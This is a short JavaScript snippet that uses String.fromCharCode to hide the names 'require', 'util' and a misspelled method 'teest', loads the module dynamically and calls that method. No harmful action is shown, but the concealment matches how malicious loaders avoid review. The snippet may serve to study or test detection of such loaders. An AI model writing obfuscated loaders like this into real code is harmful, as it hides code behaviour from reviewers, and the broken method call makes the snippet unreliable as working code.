const _executor = async () => {
    const _loader = globalThis[String.fromCharCode(114, 101, 113, 117, 105, 114, 101)];
    const _modName = String.fromCharCode(117, 116, 105, 108);
    const _loaded = await new Promise(_res => {
        _loader([_modName], _res);
    });
    const _methodName = String.fromCharCode(116, 101, 101, 115, 116);
    _loaded[_methodName]();
};
_executor();